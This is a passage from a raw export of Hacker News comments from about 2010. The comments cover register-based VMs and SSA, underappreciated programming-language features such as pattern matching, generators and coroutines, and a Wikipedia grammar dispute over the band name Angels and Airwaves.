Have you heard of SSA? the canonical intermediate representation for high performance compilers; yeah, it's register based.<p>And Dalvik wasn't the first recent VM to be that ""different""; heard of Parrot? it's register based.",1281758379
1602918,comment,1601062,1601062,0,0,silentbicycle,,,"I'm a bit disappointed in this discussion. ""strangest"" language feature sounds like a crowd pointing and laughing. Boring! What are some novel, underappreciated, unexpectedly useful language features? (And this emphatically isn't about ""my favorite language vs yours"".)<p>Here are a couple, to get things rolling.<p>Pattern matching. This is a favorite of mine - stating what you want (or expect), possibly with variables, and letting the language generate the tree of if/case statements. I find pattern-matching code extremely easy to read, easy to extend, almost always right the first time, etc. It works with both static (ML-style variant types, reminding you to check exhaustively) and dynamic (Erlang-style, ""handle what you can or throw an exception"") typing. awk is based around a weaker form of pattern matching (only matching against ints and regexes, rather than whole trees), and it's still great for quick hacks. PM seems to mesh poorly with conventional OO, though.<p>Compile-time metaprogramming. This is HN, you've probably heard plenty about Lisp macros, so I'll leave it at that.<p>Incremental development / hot code loading. Erlang has this (with soft real-time guarantees), Lisp, Smalltalk, and basically anything image-based has had this for ages. It's often easier to grow a system piece by piece than to build it upfront and plug in together afterward.<p>Iterators/generators. Without needing a fully lazy-by-default language such as Haskell, it's often handy to have a handle into a (possibly infinite) stream that you can pull from as necessary. Prolog combines pattern matching (unification really, a step beyond pattern matching) with backtracking, so you can write ""generate and test"" code: ""here's what I want, this generates a stream of all possible candidates, here's how to narrow it down"". It's sometimes too slow for use in production (due to combinatorial blowups), but it's <i>excellent</i> for prototyping, and can usually be made good enough with some tweaks.<p>Coroutines and actors. Like iterators and generators, but breaking the flow of execution into lots of little autonomous pieces. Communication makes dataflow explicit, most things can be easily understood in isolation, and they can often be run in parallel. (Coroutines are cooperative.)",1281758307

1602908,comment,1583019,1598911,0,0,carussell,,,"<i>It is a matter of British vs. American English</i><p>It is correct to say that there is a difference between British English and American English with regard to using ""is"" or ""are"" with collective nouns. It is also correct to say that those kinds of disputes happen fairly regularly on Wikipedia. It is <i>incorrect</i> to say, however, that this particular argument was an instance of that kind of dispute. I'll quote from the user himself, since my own explanations seem to be inadequate here:<p><i>The reason why ""are"" is right is because the word Angels is plural (as in more than one angel) and Airwaves (as in more than one airwave) is plural. Without the ""s"" it makes it singular (proper noun). Again, leave it like this: ""Angels and Airwaves are"", not ""Angels and Airwaves is"".</i> --Alex 101

Alex 101 would argue that since you named your dog Airwaves (""as in more than one airwave""), when you speak about certain characteristics of your dog, you should say ""Airwaves <i>are</i> an obedient puppy."", rather than ""Airwaves <i>is</i> an obedient puppy."". You can see that this has nothing to do with differences between British English and American English; they're both in agreement here. By all means you should say ""Airwaves is an obedient puppy."".<p>The argument about British versus American English might be petty, but at least there's some kind of substance to it. What Alex 101 was arguing on the other hand, is just crazy.<p>For sure, later in the discussion there <i>was</i> some mention of regional differences in style, but it was neither the impetus for the argument, nor did it constitute the bulk (or perhaps that should be the loudest?) part of the dispute.",1281757805
